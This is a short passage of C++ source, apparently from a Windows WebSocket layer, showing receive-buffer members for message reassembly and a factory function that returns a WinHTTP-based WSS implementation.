        std::vector<uint8_t> recv_chunk_;
        std::vector<uint8_t> recv_acc_;   // 二进制分片累积(消息重组)
    };

    std::unique_ptr<IWssOps> CreateWssOps(INetworkOps& net_ops) {
        (void)net_ops;   // WinHTTP 全托管, 不消费统一网络原语(见 IWssOps 工厂注)
        return std::make_unique<PlatformWin_Wss>();
    }

} // namespace cleat
